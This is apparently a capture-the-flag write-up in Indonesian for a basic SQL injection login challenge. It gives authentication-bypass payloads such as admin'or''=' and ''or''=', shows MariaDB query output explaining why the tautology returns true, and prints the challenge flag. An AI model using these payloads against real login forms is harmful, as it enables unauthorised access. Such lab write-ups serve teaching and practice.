<h1><b>Basic SQL-1</h1></b>
<pre>
Login Form (username & password)
</pre>
</b><h3>Solution</h3></b>
<p>Mencoba login dengan username = <b>admin</b>, password = <b>admin</b> maka akan muncul pesan kesalahan <b>Your username or password is incorrect</b></p>
<p>- Percobaan-1, injection username = <b>'or''='</b> , password = *abaikan* hasil masih menampilkan pesan incorrect</p>
<p>- Percobaan-2, injection username = <b>admin'or''='</b> , password = *abaikan* dan hasil success, Flag didapatkan</p>
<p>Kelemahan terdapat pada MySQL dan tidak terdapat filter dari input string php</p>

```mysql
MariaDB [CTF]> select * from SQL_Challenge1 where username = 'admin'or''='';
+----------+-----------+
| username | password  |
+----------+-----------+
| admin    | ********* |
+----------+-----------+
1 row in set (0.000 sec)

MariaDB [CTF]> select 'admin'or''='';
+----------------+
| 'admin'or''='' |
+----------------+
|              1 |
+----------------+
1 row in set, 2 warnings (0.000 sec)
```
<p>Ingat bagaimana boolean beroperasi dengan operator bitwise AND (1 AND 1 = 1), dan cara diatas bernilai True jika username yang kita input bernilai True atau
sesuai dengan database</p>

<p>Dan, Injection lain yang berlaku untuk bypass SQL pada kondisi diatas tanpa bantuan username yang valid, yaitu dengan injection <b>'or''='</b> 
pada form input username dan password</p>

```mysql
MariaDB [CTF]> select * from SQL_Challenge1 where username=''or''='' and password=''or''='';
+----------+-----------+
| username | password  |
+----------+-----------+
| admin    | ********* |
+----------+-----------+
1 row in set (0.000 sec)

```
<p>Karena pada injection diatas akan menghasilkan username nilai 1(True) dan password 1(True) dan hasilnya (1 AND 1 = 1), seperti contoh dibawah</p>

```mysql

MariaDB [CTF]> select ''or''='';
+-----------+
| ''or''='' |
+-----------+
|         1 |
+-----------+
1 row in set, 2 warnings (0.000 sec)

MariaDB [CTF]> select ''or''='' and ''or''='';
+-------------------------+
| ''or''='' and ''or''='' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set, 5 warnings (0.000 sec)
```
</b><h3>Flag</h3></b>
<pre>
VenomCTF{M0st_b4sic_SQLi}
</pre>
